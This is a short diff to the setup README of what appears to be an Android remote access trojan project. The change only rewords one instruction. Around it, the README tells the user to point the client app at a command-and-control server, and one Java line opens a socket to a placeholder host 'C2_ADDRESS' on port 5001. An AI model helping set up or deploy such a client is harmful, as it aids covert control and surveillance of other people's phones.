@@ -36,7 +36,7 @@ resp.set_cookie(key="", value="", expires="", domain="your ip/domain")
 ```
 to enable Remember Me functionality in the Login page.
 
-Specify the URL of the C2 server in the [Client app](client/app/src/main/java/com/ot/androidrat/MainService.java#L32).
+Specify the ip/domain of the C2 server in the [Client app](client/app/src/main/java/com/ot/androidrat/MainService.java#L32).
 
 ```java
 Socket ioSocket = IO.socket(URI.create("http://C2_ADDRESS:5001"));
